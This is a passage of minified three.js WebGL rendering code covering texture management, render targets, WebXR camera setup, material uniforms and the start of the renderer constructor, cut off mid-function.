0!==i.__webglTexture&&e.deleteTexture(i.__webglTexture),t.depthTexture&&t.depthTexture.dispose(),t.isWebGLCubeRenderTarget)for(var a=0;a<6;a++)e.deleteFramebuffer(n.__webglFramebuffer[a]),n.__webglDepthbuffer&&e.deleteRenderbuffer(n.__webglDepthbuffer[a]);else e.deleteFramebuffer(n.__webglFramebuffer),n.__webglDepthbuffer&&e.deleteRenderbuffer(n.__webglDepthbuffer),n.__webglMultisampledFramebuffer&&e.deleteFramebuffer(n.__webglMultisampledFramebuffer),n.__webglColorRenderbuffer&&e.deleteRenderbuffer(n.__webglColorRenderbuffer),n.__webglDepthRenderbuffer&&e.deleteRenderbuffer(n.__webglDepthRenderbuffer);r.remove(t.texture),r.remove(t)}}(n),o.memory.textures--}var H=0;function V(e,t){var i,a,s=r.get(e);if(e.isVideoTexture&&(i=e,a=o.render.frame,I.get(i)!==a&&(I.set(i,a),i.update())),0<e.version&&s.__version!==e.version){var l=e.image;if(void 0===l);else if(!1!==l.complete)return void X(s,e,t)}n.activeTexture(33984+t),n.bindTexture(3553,s.__webglTexture)}function Q(t,i){var o=r.get(t);0<t.version&&o.__version!==t.version?function(t,r,i){if(6===r.image.length){q(t,r),n.activeTexture(33984+i),n.bindTexture(34067,t.__webglTexture),e.pixelStorei(37440,r.flipY);for(var o=r&&(r.isCompressedTexture||r.image[0].isCompressedTexture),s=r.image[0]&&r.image[0].isDataTexture,l=[],c=0;c<6;c++)l[c]=o||s?s?r.image[c].image:r.image[c]:O(r.image[c],!1,!0,E);var u,d=l[0],p=N(d)||B,h=a.convert(r.format),f=a.convert(r.type),A=j(r.internalFormat,h,f);if(K(34067,r,p),o){for(var m=0;m<6;m++){u=l[m].mipmaps;for(var v=0;v<u.length;v++){var g=u[v];r.format!==x&&r.format!==C?null!==h&&n.compressedTexImage2D(34069+m,v,A,g.width,g.height,0,g.data):n.texImage2D(34069+m,v,A,g.width,g.height,0,h,f,g.data)}}t.__maxMipLevel=u.length-1}else{u=r.mipmaps;for(var y=0;y<6;y++)if(s){n.texImage2D(34069+y,0,A,l[y].width,l[y].height,0,h,f,l[y].data);for(var b=0;b<u.length;b++){var _=u[b].image[y].image;n.texImage2D(34069+y,b+1,A,_.width,_.height,0,h,f,_.data)}}else{n.texImage2D(34069+y,0,A,h,f,l[y]);for(var w=0;w<u.length;w++){var S=u[w];n.texImage2D(34069+y,w+1,A,h,f,S.image[y])}}t.__maxMipLevel=u.length}D(r,p)&&R(34067,r,d.width,d.height),t.__version=r.version,r.onUpdate&&r.onUpdate(r)}}(o,t,i):(n.activeTexture(33984+i),n.bindTexture(34067,o.__webglTexture))}var G=((s={})[l]=10497,s[c]=33071,s[u]=33648,s),W=((v={})[d]=9728,v[p]=9984,v[h]=9986,v[f]=9729,v[A]=9985,v[m]=9987,v);function K(n,a,o){o?(e.texParameteri(n,10242,G[a.wrapS]),e.texParameteri(n,10243,G[a.wrapT]),32879!==n&&35866!==n||e.texParameteri(n,32882,G[a.wrapR]),e.texParameteri(n,10240,W[a.magFilter]),e.texParameteri(n,10241,W[a.minFilter])):(e.texParameteri(n,10242,33071),e.texParameteri(n,10243,33071),32879!==n&&35866!==n||e.texParameteri(n,32882,33071),a.wrapS!==c||a.wrapT,e.texParameteri(n,10240,U(a.magFilter)),e.texParameteri(n,10241,U(a.minFilter)),a.minFilter!==d&&a.minFilter);var s=t.get("EXT_texture_filter_anisotropic");if(s){if(a.type===b&&null===t.get("OES_texture_float_linear"))return;if(a.type===_&&null===(B||t.get("OES_texture_half_float_linear")))return;(1<a.anisotropy||r.get(a).__currentAnisotropy)&&(e.texParameterf(n,s.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(a.anisotropy,i.getMaxAnisotropy())),r.get(a).__currentAnisotropy=a.anisotropy)}}function q(t,n){void 0===t.__webglInit&&(t.__webglInit=!0,n.addEventListener("dispose",$),t.__webglTexture=e.createTexture(),o.memory.textures++)}function X(t,r,i){var o=3553;r.isDataTexture2DArray&&(o=35866),r.isDataTexture3D&&(o=32879),q(t,r),n.activeTexture(33984+i),n.bindTexture(o,t.__webglTexture),e.pixelStorei(37440,r.flipY),e.pixelStorei(37441,r.premultiplyAlpha),e.pixelStorei(3317,r.unpackAlignment);var s,l,u=(s=r,!B&&(s.wrapS!==c||s.wrapT!==c||s.minFilter!==d&&s.minFilter!==f)&&!1===N(r.image)),p=O(r.image,u,!1,T),h=N(p)||B,A=a.convert(r.format),m=a.convert(r.type),v=j(r.internalFormat,A,m);K(o,r,h);var _=r.mipmaps;if(r.isDepthTexture)v=6402,B?v=r.type===b?36012:r.type===y?33190:r.type===w?35056:33189:r.type,r.format===S&&6402===v&&r.type!==g&&r.type!==y&&(r.type=g,m=a.convert(r.type)),r.format===k&&6402===v&&(v=34041,r.type!==w&&(r.type=w,m=a.convert(r.type))),n.texImage2D(3553,0,v,p.width,p.height,0,A,m,null);else if(r.isDataTexture)if(0<_.length&&h){for(var M=0,E=_.length;M<E;M++)l=_[M],n.texImage2D(3553,M,v,l.width,l.height,0,A,m,l.data);r.generateMipmaps=!1,t.__maxMipLevel=_.length-1}else n.texImage2D(3553,0,v,p.width,p.height,0,A,m,p.data),t.__maxMipLevel=0;else if(r.isCompressedTexture){for(var P=0,I=_.length;P<I;P++)l=_[P],r.format!==x&&r.format!==C?null!==A&&n.compressedTexImage2D(3553,P,v,l.width,l.height,0,l.data):n.texImage2D(3553,P,v,l.width,l.height,0,A,m,l.data);t.__maxMipLevel=_.length-1}else if(r.isDataTexture2DArray)n.texImage3D(35866,0,v,p.width,p.height,p.depth,0,A,m,p.data),t.__maxMipLevel=0;else if(r.isDataTexture3D)n.texImage3D(32879,0,v,p.width,p.height,p.depth,0,A,m,p.data),t.__maxMipLevel=0;else if(0<_.length&&h){for(var F=0,L=_.length;F<L;F++)l=_[F],n.texImage2D(3553,F,v,A,m,l);r.generateMipmaps=!1,t.__maxMipLevel=_.length-1}else n.texImage2D(3553,0,v,A,m,p),t.__maxMipLevel=0;D(r,h)&&R(o,r,p.width,p.height),t.__version=r.version,r.onUpdate&&r.onUpdate(r)}function Y(t,i,o,s){var l=a.convert(i.texture.format),c=a.convert(i.texture.type),u=j(i.texture.internalFormat,l,c);n.texImage2D(s,0,u,i.width,i.height,0,l,c,null),e.bindFramebuffer(36160,t),e.framebufferTexture2D(36160,o,s,r.get(i.texture).__webglTexture,0),e.bindFramebuffer(36160,null)}function Z(t,n,r){if(e.bindRenderbuffer(36161,t),n.depthBuffer&&!n.stencilBuffer){var i=33189;if(r){var o=n.depthTexture;o&&o.isDepthTexture&&(o.type===b?i=36012:o.type===y&&(i=33190));var s=ee(n);e.renderbufferStorageMultisample(36161,s,i,n.width,n.height)}else e.renderbufferStorage(36161,i,n.width,n.height);e.framebufferRenderbuffer(36160,36096,36161,t)}else if(n.depthBuffer&&n.stencilBuffer){if(r){var l=ee(n);e.renderbufferStorageMultisample(36161,l,35056,n.width,n.height)}else e.renderbufferStorage(36161,34041,n.width,n.height);e.framebufferRenderbuffer(36160,33306,36161,t)}else{var c=a.convert(n.texture.format),u=a.convert(n.texture.type),d=j(n.texture.internalFormat,c,u);if(r){var p=ee(n);e.renderbufferStorageMultisample(36161,p,d,n.width,n.height)}else e.renderbufferStorage(36161,d,n.width,n.height)}e.bindRenderbuffer(36161,null)}function ee(e){return B&&e.isWebGLMultisampleRenderTarget?Math.min(P,e.samples):0}var te=!1,ne=!1;this.allocateTextureUnit=function(){var e=H;return H+=1,e},this.resetTextureUnits=function(){H=0},this.setTexture2D=V,this.setTexture2DArray=function(e,t){var i=r.get(e);0<e.version&&i.__version!==e.version?X(i,e,t):(n.activeTexture(33984+t),n.bindTexture(35866,i.__webglTexture))},this.setTexture3D=function(e,t){var i=r.get(e);0<e.version&&i.__version!==e.version?X(i,e,t):(n.activeTexture(33984+t),n.bindTexture(32879,i.__webglTexture))},this.setTextureCube=Q,this.setupRenderTarget=function(t){var i=r.get(t),s=r.get(t.texture);t.addEventListener("dispose",z),s.__webglTexture=e.createTexture(),o.memory.textures++;var l=!0===t.isWebGLCubeRenderTarget,c=!0===t.isWebGLMultisampleRenderTarget,u=N(t)||B;if(!B||t.texture.format!==C||t.texture.type!==b&&t.texture.type!==_||(t.texture.format=x),l){i.__webglFramebuffer=[];for(var d=0;d<6;d++)i.__webglFramebuffer[d]=e.createFramebuffer()}else if(i.__webglFramebuffer=e.createFramebuffer(),c&&B){i.__webglMultisampledFramebuffer=e.createFramebuffer(),i.__webglColorRenderbuffer=e.createRenderbuffer(),e.bindRenderbuffer(36161,i.__webglColorRenderbuffer);var p=a.convert(t.texture.format),h=a.convert(t.texture.type),f=j(t.texture.internalFormat,p,h),A=ee(t);e.renderbufferStorageMultisample(36161,A,f,t.width,t.height),e.bindFramebuffer(36160,i.__webglMultisampledFramebuffer),e.framebufferRenderbuffer(36160,36064,36161,i.__webglColorRenderbuffer),e.bindRenderbuffer(36161,null),t.depthBuffer&&(i.__webglDepthRenderbuffer=e.createRenderbuffer(),Z(i.__webglDepthRenderbuffer,t,!0)),e.bindFramebuffer(36160,null)}if(l){n.bindTexture(34067,s.__webglTexture),K(34067,t.texture,u);for(var m=0;m<6;m++)Y(i.__webglFramebuffer[m],t,36064,34069+m);D(t.texture,u)&&R(34067,t.texture,t.width,t.height),n.bindTexture(34067,null)}else n.bindTexture(3553,s.__webglTexture),K(3553,t.texture,u),Y(i.__webglFramebuffer,t,36064,3553),D(t.texture,u)&&R(3553,t.texture,t.width,t.height),n.bindTexture(3553,null);t.depthBuffer&&function(t){var n=r.get(t),i=!0===t.isWebGLCubeRenderTarget;if(t.depthTexture){if(i)throw new Error("target.depthTexture not supported in Cube render targets");!function(t,n){if(n&&n.isWebGLCubeRenderTarget)throw new Error("Depth Texture with cube render targets is not supported");if(e.bindFramebuffer(36160,t),!n.depthTexture||!n.depthTexture.isDepthTexture)throw new Error("renderTarget.depthTexture must be an instance of THREE.DepthTexture");r.get(n.depthTexture).__webglTexture&&n.depthTexture.image.width===n.width&&n.depthTexture.image.height===n.height||(n.depthTexture.image.width=n.width,n.depthTexture.image.height=n.height,n.depthTexture.needsUpdate=!0),V(n.depthTexture,0);var i=r.get(n.depthTexture).__webglTexture;if(n.depthTexture.format===S)e.framebufferTexture2D(36160,36096,3553,i,0);else{if(n.depthTexture.format!==k)throw new Error("Unknown depthTexture format");e.framebufferTexture2D(36160,33306,3553,i,0)}}(n.__webglFramebuffer,t)}else if(i){n.__webglDepthbuffer=[];for(var a=0;a<6;a++)e.bindFramebuffer(36160,n.__webglFramebuffer[a]),n.__webglDepthbuffer[a]=e.createRenderbuffer(),Z(n.__webglDepthbuffer[a],t,!1)}else e.bindFramebuffer(36160,n.__webglFramebuffer),n.__webglDepthbuffer=e.createRenderbuffer(),Z(n.__webglDepthbuffer,t,!1);e.bindFramebuffer(36160,null)}(t)},this.updateRenderTargetMipmap=function(e){var t=e.texture;if(D(t,N(e)||B)){var i=e.isWebGLCubeRenderTarget?34067:3553,a=r.get(t).__webglTexture;n.bindTexture(i,a),R(i,t,e.width,e.height),n.bindTexture(i,null)}},this.updateMultisampleRenderTarget=function(t){if(t.isWebGLMultisampleRenderTarget&&B){var n=r.get(t);e.bindFramebuffer(36008,n.__webglMultisampledFramebuffer),e.bindFramebuffer(36009,n.__webglFramebuffer);var i=t.width,a=t.height,o=16384;t.depthBuffer&&(o|=256),t.stencilBuffer&&(o|=1024),e.blitFramebuffer(0,0,i,a,0,0,i,a,o,9728),e.bindFramebuffer(36160,n.__webglMultisampledFramebuffer)}},this.safeSetTexture2D=function(e,t){e&&e.isWebGLRenderTarget&&(!1===te&&(te=!0),e=e.texture),V(e,t)},this.safeSetTextureCube=function(e,t){e&&e.isWebGLCubeRenderTarget&&(!1===ne&&(ne=!0),e=e.texture),Q(e,t)}}function Ui(e,t,n){var r=n.isWebGL2;return{convert:function(e){var n;if(e===v)return 5121;if(1017===e)return 32819;if(1018===e)return 32820;if(1019===e)return 33635;if(1010===e)return 5120;if(1011===e)return 5122;if(e===g)return 5123;if(1013===e)return 5124;if(e===y)return 5125;if(e===b)return 5126;if(e===_)return r?5131:null!==(n=t.get("OES_texture_half_float"))?n.HALF_FLOAT_OES:null;if(1021===e)return 6406;if(e===C)return 6407;if(e===x)return 6408;if(1024===e)return 6409;if(1025===e)return 6410;if(e===S)return 6402;if(e===k)return 34041;if(1028===e)return 6403;if(1029===e)return 36244;if(1030===e)return 33319;if(1031===e)return 33320;if(1032===e)return 36248;if(1033===e)return 36249;if(e===M||e===B||e===E||e===T){if(null===(n=t.get("WEBGL_compressed_texture_s3tc")))return null;if(e===M)return n.COMPRESSED_RGB_S3TC_DXT1_EXT;if(e===B)return n.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(e===E)return n.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(e===T)return n.COMPRESSED_RGBA_S3TC_DXT5_EXT}if(e===P||e===I||e===F||e===L){if(null===(n=t.get("WEBGL_compressed_texture_pvrtc")))return null;if(e===P)return n.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(e===I)return n.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(e===F)return n.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(e===L)return n.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}if(36196===e)return null!==(n=t.get("WEBGL_compressed_texture_etc1"))?n.COMPRESSED_RGB_ETC1_WEBGL:null;if((e===O||e===N)&&null!==(n=t.get("WEBGL_compressed_texture_etc"))){if(e===O)return n.COMPRESSED_RGB8_ETC2;if(e===N)return n.COMPRESSED_RGBA8_ETC2_EAC}return 37808===e||37809===e||37810===e||37811===e||37812===e||37813===e||37814===e||37815===e||37816===e||37817===e||37818===e||37819===e||37820===e||37821===e||37840===e||37841===e||37842===e||37843===e||37844===e||37845===e||37846===e||37847===e||37848===e||37849===e||37850===e||37851===e||37852===e||37853===e?null!==(n=t.get("WEBGL_compressed_texture_astc"))?e:null:36492===e?null!==(n=t.get("EXT_texture_compression_bptc"))?e:null:e===w?r?34042:null!==(n=t.get("WEBGL_depth_texture"))?n.UNSIGNED_INT_24_8_WEBGL:null:void 0}}}function $i(e){Ln.call(this),this.cameras=e||[]}function zi(){pt.call(this),this.type="Group"}function Hi(){this._targetRay=null,this._grip=null,this._hand=null}function Vi(e,t){var n=this,r=null,i=1,a=null,o="local-floor",s=null,l=[],c=new Map,u=new Ln;u.layers.enable(1),u.viewport=new ce;var d=new Ln;d.layers.enable(2),d.viewport=new ce;var p=[u,d],h=new $i;h.layers.enable(1),h.layers.enable(2);var f=null,A=null;function m(e){var t=c.get(e.inputSource);t&&t.dispatchEvent({type:e.type,data:e.inputSource})}function v(){c.forEach((function(e,t){e.disconnect(t)})),c.clear(),e.setFramebuffer(null),e.setRenderTarget(e.getRenderTarget()),x.stop(),n.isPresenting=!1,n.dispatchEvent({type:"sessionend"})}function g(e){a=e,x.setContext(r),x.start(),n.isPresenting=!0,n.dispatchEvent({type:"sessionstart"})}function y(e){for(var t=r.inputSources,n=0;n<l.length;n++)c.set(t[n],l[n]);for(var i=0;i<e.removed.length;i++){var a=e.removed[i],o=c.get(a);o&&(o.dispatchEvent({type:"disconnected",data:a}),c.delete(a))}for(var s=0;s<e.added.length;s++){var u=e.added[s],d=c.get(u);d&&d.dispatchEvent({type:"connected",data:u})}}this.enabled=!1,this.isPresenting=!1,this.getController=function(e){var t=l[e];return void 0===t&&(t=new Hi,l[e]=t),t.getTargetRaySpace()},this.getControllerGrip=function(e){var t=l[e];return void 0===t&&(t=new Hi,l[e]=t),t.getGripSpace()},this.getHand=function(e){var t=l[e];return void 0===t&&(t=new Hi,l[e]=t),t.getHandSpace()},this.setFramebufferScaleFactor=function(e){i=e,n.isPresenting},this.setReferenceSpaceType=function(e){o=e,n.isPresenting},this.getReferenceSpace=function(){return a},this.getSession=function(){return r},this.setSession=function(e){if(null!==(r=e)){r.addEventListener("select",m),r.addEventListener("selectstart",m),r.addEventListener("selectend",m),r.addEventListener("squeeze",m),r.addEventListener("squeezestart",m),r.addEventListener("squeezeend",m),r.addEventListener("end",v);var n=t.getContextAttributes();!0!==n.xrCompatible&&t.makeXRCompatible();var a={antialias:n.antialias,alpha:n.alpha,depth:n.depth,stencil:n.stencil,framebufferScaleFactor:i},s=new XRWebGLLayer(r,t,a);r.updateRenderState({baseLayer:s}),r.requestReferenceSpace(o).then(g),r.addEventListener("inputsourceschange",y)}};var b=new he,_=new he;function w(e,t){null===t?e.matrixWorld.copy(e.matrix):e.matrixWorld.multiplyMatrices(t.matrixWorld,e.matrix),e.matrixWorldInverse.getInverse(e.matrixWorld)}this.getCamera=function(e){h.near=d.near=u.near=e.near,h.far=d.far=u.far=e.far,f===h.near&&A===h.far||(r.updateRenderState({depthNear:h.near,depthFar:h.far}),f=h.near,A=h.far);var t=e.parent,n=h.cameras;w(h,t);for(var i=0;i<n.length;i++)w(n[i],t);e.matrixWorld.copy(h.matrixWorld);for(var a=e.children,o=0,s=a.length;o<s;o++)a[o].updateMatrixWorld(!0);return 2===n.length?function(e,t,n){b.setFromMatrixPosition(t.matrixWorld),_.setFromMatrixPosition(n.matrixWorld);var r=b.distanceTo(_),i=t.projectionMatrix.elements,a=n.projectionMatrix.elements,o=i[14]/(i[10]-1),s=i[14]/(i[10]+1),l=(i[9]+1)/i[5],c=(i[9]-1)/i[5],u=(i[8]-1)/i[0],d=(a[8]+1)/a[0],p=o*u,h=o*d,f=r/(-u+d),A=f*-u;t.matrixWorld.decompose(e.position,e.quaternion,e.scale),e.translateX(A),e.translateZ(f),e.matrixWorld.compose(e.position,e.quaternion,e.scale),e.matrixWorldInverse.getInverse(e.matrixWorld);var m=o+f,v=s+f,g=p-A,y=h+(r-A),w=l*s/v*m,C=c*s/v*m;e.projectionMatrix.makePerspective(g,y,w,C,m,v)}(h,u,d):h.projectionMatrix.copy(u.projectionMatrix),h};var C=null,x=new zn;x.setAnimationLoop((function(t,n){if(null!==(s=n.getViewerPose(a))){var i=s.views,o=r.renderState.baseLayer;e.setFramebuffer(o.framebuffer);var c=!1;i.length!==h.cameras.length&&(c=!(h.cameras.length=0));for(var u=0;u<i.length;u++){var d=i[u],f=o.getViewport(d),A=p[u];A.matrix.fromArray(d.transform.matrix),A.projectionMatrix.fromArray(d.projectionMatrix),A.viewport.set(f.x,f.y,f.width,f.height),0===u&&h.matrix.copy(A.matrix),!0===c&&h.cameras.push(A)}}for(var m=r.inputSources,v=0;v<l.length;v++){var g=l[v],y=m[v];g.update(y,n,a)}C&&C(t,n)})),this.setAnimationLoop=function(e){C=e},this.dispose=function(){}}function Qi(e){function t(t,n){t.opacity.value=n.opacity,n.color&&t.diffuse.value.copy(n.color),n.emissive&&t.emissive.value.copy(n.emissive).multiplyScalar(n.emissiveIntensity),n.map&&(t.map.value=n.map),n.alphaMap&&(t.alphaMap.value=n.alphaMap),n.specularMap&&(t.specularMap.value=n.specularMap);var r,i,a=e.get(n).envMap;if(a){t.envMap.value=a,t.flipEnvMap.value=a.isCubeTexture&&a._needsFlipEnvMap?-1:1,t.reflectivity.value=n.reflectivity,t.refractionRatio.value=n.refractionRatio;var o=e.get(a).__maxMipLevel;void 0!==o&&(t.maxMipLevel.value=o)}n.lightMap&&(t.lightMap.value=n.lightMap,t.lightMapIntensity.value=n.lightMapIntensity),n.aoMap&&(t.aoMap.value=n.aoMap,t.aoMapIntensity.value=n.aoMapIntensity),n.map?r=n.map:n.specularMap?r=n.specularMap:n.displacementMap?r=n.displacementMap:n.normalMap?r=n.normalMap:n.bumpMap?r=n.bumpMap:n.roughnessMap?r=n.roughnessMap:n.metalnessMap?r=n.metalnessMap:n.alphaMap?r=n.alphaMap:n.emissiveMap?r=n.emissiveMap:n.clearcoatMap?r=n.clearcoatMap:n.clearcoatNormalMap?r=n.clearcoatNormalMap:n.clearcoatRoughnessMap&&(r=n.clearcoatRoughnessMap),void 0!==r&&(r.isWebGLRenderTarget&&(r=r.texture),!0===r.matrixAutoUpdate&&r.updateMatrix(),t.uvTransform.value.copy(r.matrix)),n.aoMap?i=n.aoMap:n.lightMap&&(i=n.lightMap),void 0!==i&&(i.isWebGLRenderTarget&&(i=i.texture),!0===i.matrixAutoUpdate&&i.updateMatrix(),t.uv2Transform.value.copy(i.matrix))}function n(t,n){t.roughness.value=n.roughness,t.metalness.value=n.metalness,n.roughnessMap&&(t.roughnessMap.value=n.roughnessMap),n.metalnessMap&&(t.metalnessMap.value=n.metalnessMap),n.emissiveMap&&(t.emissiveMap.value=n.emissiveMap),n.bumpMap&&(t.bumpMap.value=n.bumpMap,t.bumpScale.value=n.bumpScale,1===n.side&&(t.bumpScale.value*=-1)),n.normalMap&&(t.normalMap.value=n.normalMap,t.normalScale.value.copy(n.normalScale),1===n.side&&t.normalScale.value.negate()),n.displacementMap&&(t.displacementMap.value=n.displacementMap,t.displacementScale.value=n.displacementScale,t.displacementBias.value=n.displacementBias),e.get(n).envMap&&(t.envMapIntensity.value=n.envMapIntensity)}return{refreshFogUniforms:function(e,t){e.fogColor.value.copy(t.color),t.isFog?(e.fogNear.value=t.near,e.fogFar.value=t.far):t.isFogExp2&&(e.fogDensity.value=t.density)},refreshMaterialUniforms:function(e,r,i,a){var o,s,l,c,u,d,p,h,f,A,m,v,g,y,b,_,w,C,x,S,k,M,B,E,T,P,I,F;r.isMeshBasicMaterial?t(e,r):r.isMeshLambertMaterial?(t(e,r),p=e,(h=r).emissiveMap&&(p.emissiveMap.value=h.emissiveMap)):r.isMeshToonMaterial?(t(e,r),I=e,(F=r).gradientMap&&(I.gradientMap.value=F.gradientMap),F.emissiveMap&&(I.emissiveMap.value=F.emissiveMap),F.bumpMap&&(I.bumpMap.value=F.bumpMap,I.bumpScale.value=F.bumpScale,1===F.side&&(I.bumpScale.value*=-1)),F.normalMap&&(I.normalMap.value=F.normalMap,I.normalScale.value.copy(F.normalScale),1===F.side&&I.normalScale.value.negate()),F.displacementMap&&(I.displacementMap.value=F.displacementMap,I.displacementScale.value=F.displacementScale,I.displacementBias.value=F.displacementBias)):r.isMeshPhongMaterial?(t(e,r),P=r,(T=e).specular.value.copy(P.specular),T.shininess.value=Math.max(P.shininess,1e-4),P.emissiveMap&&(T.emissiveMap.value=P.emissiveMap),P.bumpMap&&(T.bumpMap.value=P.bumpMap,T.bumpScale.value=P.bumpScale,1===P.side&&(T.bumpScale.value*=-1)),P.normalMap&&(T.normalMap.value=P.normalMap,T.normalScale.value.copy(P.normalScale),1===P.side&&T.normalScale.value.negate()),P.displacementMap&&(T.displacementMap.value=P.displacementMap,T.displacementScale.value=P.displacementScale,T.displacementBias.value=P.displacementBias)):r.isMeshStandardMaterial?(t(e,r),r.isMeshPhysicalMaterial?(n(B=e,E=r),B.reflectivity.value=E.reflectivity,B.clearcoat.value=E.clearcoat,B.clearcoatRoughness.value=E.clearcoatRoughness,E.sheen&&B.sheen.value.copy(E.sheen),E.clearcoatMap&&(B.clearcoatMap.value=E.clearcoatMap),E.clearcoatRoughnessMap&&(B.clearcoatRoughnessMap.value=E.clearcoatRoughnessMap),E.clearcoatNormalMap&&(B.clearcoatNormalScale.value.copy(E.clearcoatNormalScale),B.clearcoatNormalMap.value=E.clearcoatNormalMap,1===E.side&&B.clearcoatNormalScale.value.negate()),B.transmission.value=E.transmission,E.transmissionMap&&(B.transmissionMap.value=E.transmissionMap)):n(e,r)):r.isMeshMatcapMaterial?(t(e,r),k=e,(M=r).matcap&&(k.matcap.value=M.matcap),M.bumpMap&&(k.bumpMap.value=M.bumpMap,k.bumpScale.value=M.bumpScale,1===M.side&&(k.bumpScale.value*=-1)),M.normalMap&&(k.normalMap.value=M.normalMap,k.normalScale.value.copy(M.normalScale),1===M.side&&k.normalScale.value.negate()),M.displacementMap&&(k.displacementMap.value=M.displacementMap,k.displacementScale.value=M.displacementScale,k.displacementBias.value=M.displacementBias)):r.isMeshDepthMaterial?(t(e,r),u=e,(d=r).displacementMap&&(u.displacementMap.value=d.displacementMap,u.displacementScale.value=d.displacementScale,u.displacementBias.value=d.displacementBias)):r.isMeshDistanceMaterial?(t(e,r),x=e,(S=r).displacementMap&&(x.displacementMap.value=S.displacementMap,x.displacementScale.value=S.displacementScale,x.displacementBias.value=S.displacementBias),x.referencePosition.value.copy(S.referencePosition),x.nearDistance.value=S.nearDistance,x.farDistance.value=S.farDistance):r.isMeshNormalMaterial?(t(e,r),w=e,(C=r).bumpMap&&(w.bumpMap.value=C.bumpMap,w.bumpScale.value=C.bumpScale,1===C.side&&(w.bumpScale.value*=-1)),C.normalMap&&(w.normalMap.value=C.normalMap,w.normalScale.value.copy(C.normalScale),1===C.side&&w.normalScale.value.negate()),C.displacementMap&&(w.displacementMap.value=C.displacementMap,w.displacementScale.value=C.displacementScale,w.displacementBias.value=C.displacementBias)):r.isLineBasicMaterial?(c=r,(l=e).diffuse.value.copy(c.color),l.opacity.value=c.opacity,r.isLineDashedMaterial&&(s=r,(o=e).dashSize.value=s.dashSize,o.totalSize.value=s.dashSize+s.gapSize,o.scale.value=s.scale)):r.isPointsMaterial?(g=r,y=i,b=a,(v=e).diffuse.value.copy(g.color),v.opacity.value=g.opacity,v.size.value=g.size*y,v.scale.value=.5*b,g.map&&(v.map.value=g.map),g.alphaMap&&(v.alphaMap.value=g.alphaMap),g.map?_=g.map:g.alphaMap&&(_=g.alphaMap),void 0!==_&&(!0===_.matrixAutoUpdate&&_.updateMatrix(),v.uvTransform.value.copy(_.matrix))):r.isSpriteMaterial?(A=r,(f=e).diffuse.value.copy(A.color),f.opacity.value=A.opacity,f.rotation.value=A.rotation,A.map&&(f.map.value=A.map),A.alphaMap&&(f.alphaMap.value=A.alphaMap),A.map?m=A.map:A.alphaMap&&(m=A.alphaMap),void 0!==m&&(!0===m.matrixAutoUpdate&&m.updateMatrix(),f.uvTransform.value.copy(m.matrix))):r.isShadowMaterial?(e.color.value.copy(r.color),e.opacity.value=r.opacity):r.isShaderMaterial&&(r.uniformsNeedUpdate=!1)}}}function Gi(e){var t=void 0!==(e=e||{}).canvas?e.canvas:document.createElementNS("http://www.w3.org/1999/xhtml","canvas"),n=void 0!==e.context?e.context:null,r=void 0!==e.alpha&&e.alpha,i=void 0===e.depth||e.depth,a=void 0===e.stencil||e.stencil,o=void 0!==e.antialias&&e.antialias,s=void 0===e.premultipliedAlpha||e.premultipliedAlpha,l=void 0!==e.preserveDrawingBuffer&&e.preserveDrawingBuffer,c=void 0!==e.powerPreference?e.powerPreference:"default",u=void 0!==e.failIfMajorPerformanceCaveat&&e.failIfMajorPerformanceCaveat,d=null,p=null;this.domElement=t,this.debug={checkShaderErrors:!0},this.autoClear=!0,this.autoClearColor=!0,this.autoClearDepth=!0,this.autoClearStencil=!0,this.sortObjects=!0,this.clippingPlanes=[],this.localClippingEnabled=!1,this.gammaFactor=2,this.outputEncoding=D,this.physicallyCorrectLights=!1,this.toneMapping=0,this.toneMappingExposure=1,this.maxMorphTargets=8,this.maxMorphNormals=4;var h=this,f=!1,A=null,m=0,g=0,y=null,w=null,C=-1,S=null,k=null,M=new ce,B=new ce,E=null,T=t.width,P=t.height,I=1,F=null,L=null,O=new ce(0,0,T,P),N=new ce(0,0,T,P),R=!1,j=new $n,U=!1,$=!1,z=new $e,H=new he,V={background:null,fog:null,environment:null,overrideMaterial:null,isScene:!0};function Q(){return null===y?I:1}var G,W,K,q,X,Y,Z,ee,te,ne,re,ae,oe,se,le,ue,de,pe,fe,Ae,me,ve=n;function ge(e,n){for(var r=0;r<e.length;r++){var i=e[r],a=t.getContext(i,n);if(null!==a)return a}return null}try{var ye={alpha:r,depth:i,stencil:a,antialias:o,premultipliedAlpha:s,preserveDrawingBuffer:l,powerPreference:c,failIfMajorPerformanceCaveat:u};if(t.addEventListener("webglcontextlost",xe,!1),t.addEventListener("webglcontextrestored",Se,!1),null===ve){var be=["webgl2","webgl","experimental-webgl"];if(!0===h.isWebGL1Renderer&&be.shift(),null===(ve=ge(be,ye)))throw ge(be)?new Error("Error creating WebGL context with your selected attributes."):new Error("Error creating WebGL context.")}void 0===ve.getShaderPrecisionFormat&&(ve.getShaderPrecisionFormat=function(){return{rangeMin:1,rangeMax:1,precision:1}})}catch(e){throw e}function _e(){G=new er(ve),!1===(W=new Yn(ve,G,e)).isWebGL2&&(G.get("WEBGL_depth_texture"),G.get("OES_texture_float"),G.get("OES_texture_half_float"),G.get("OES_texture_half_float_linear"),G.get("OES_standard_derivatives"),G.get("OES_element_index_uint"),G.get("OES_vertex_array_object"),G.get("ANGLE_instanced_arrays")),G.get("OES_texture_float_linear"),Ae=new Ui(ve,G,W),(K=new Ri(ve,G,W)).scissor(B.copy(N).multiplyScalar(I).floor()),K.viewport(M.copy(O).multiplyScalar(I).floor()),q=new rr(ve),X=new xi,Y=new ji(ve,G,K,X,W,Ae,q),Z=new Zn(h),ee=new Hn(ve,W),me=new qn(ve,G,ee,W),te=new tr(ve,ee,q,me),ne=new sr(ve,te,ee,q),de=new or(ve),le=new Jn(X),re=new Ci(h,Z,G,W,me,le),ae=new Qi(X),oe=new Bi(X),se=new Li(G,W),ue=new Kn(h,Z,K,ne,s),pe=new Xn(ve,G,q,W),fe=new nr(ve,G,q,W),q.programs=re.programs,h.capabilities=W,h.extensions=G,h.properties=X,h.renderLists=oe,h.state=K,h.info=q}_e();var we=new Vi(h,ve);this.xr=we;var Ce=new Di(h,ne,W.maxTextureSize);function xe(e){e.preventDefault(),f=!0}function Se(){f=!1,_e()}function ke(e){var t,n=e.target;n.removeEventListener("dispose",ke),Me(t=n),X.remove(t)}function Me(e){var t=X.get(e).program;void 0!==t&&re.releaseProgram(t)}this.shadowMap=Ce,this.getContext=function(){return 